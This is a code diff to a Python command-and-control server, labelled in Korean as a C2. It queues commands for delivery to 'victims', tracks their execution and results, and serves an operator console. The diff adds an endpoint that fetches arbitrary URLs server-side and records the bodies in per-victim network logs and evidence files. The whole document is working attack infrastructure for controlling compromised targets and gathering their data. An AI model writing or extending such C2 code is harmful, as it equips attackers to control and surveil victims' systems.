@@ -14,7 +14,7 @@
   GET  /bxconsole    운영자 웹 콘솔 (구 /op → 302 리다이렉트)
 명령 상태: QUEUED(대기) → SENT(피해자 전달) → DONE(실행·결과 수신)
 """
-import http.server, socketserver, json, time, os, sys, re, base64, shutil, ssl, urllib.parse, random, string, threading
+import http.server, socketserver, json, time, os, sys, re, base64, shutil, ssl, urllib.parse, urllib.request, random, string, threading
 
 PORT  = int(os.environ.get("BX_C2_PORT", "7700"))
 ROOT  = os.path.dirname(os.path.abspath(__file__))
@@ -488,6 +488,31 @@ class Handler(http.server.BaseHTTPRequestHandler):
         elif p == "/api/probes":
             with LOCK:
                 self._send(200, "application/json", json.dumps(list(PROBES), ensure_ascii=False).encode())
+        elif p == "/api/fetchbody":
+            # 서버 측 프록시 페치 — 교차 출처 리소스의 바디를 채운다 (공개 리소스 대상)
+            q = urllib.parse.parse_qs(u.query)
+            vid = sanitize_vid(q.get("vid", [""])[0])
+            url = (q.get("url", [""])[0])[:1000]
+            if not vid or not url.startswith(("http://", "https://")):
+                self._send(200, "application/json", b'{"ok":false,"error":"bad request"}'); return
+            try:
+                _rq = urllib.request.Request(url, headers={"User-Agent": "BXConsole/0.3"})
+                with urllib.request.urlopen(_rq, timeout=6) as resp:
+                    _body = resp.read(1024 * 1024)
+                    _st, _ct = resp.status, (resp.headers.get("Content-Type") or "")[:200]
+            except Exception as e:
+                self._send(200, "application/json",
+                           json.dumps({"ok": False, "error": str(e)[:200]}).encode()); return
+            with LOCK:
+                for _r in reversed(NET.get(vid, [])):
+                    if _r.get("ro") and _r.get("url") == url:
+                        _r.update(body=_body.decode(errors="replace")[:8000],
+                                  ct=_ct, status=_st, size=len(_body))
+                        break
+            evidence({"t": time.strftime("%FT%T"), "tag": "probe", "id": vid,
+                      "data": {"server_fetch": url[:200], "status": _st, "size": len(_body)}})
+            self._send(200, "application/json",
+                       json.dumps({"ok": True, "status": _st, "ct": _ct, "size": len(_body)}).encode())
         elif p == "/bxconsole":
             self._send(200, "text/html", open(OPHTML).read().encode())
         elif p == "/op":
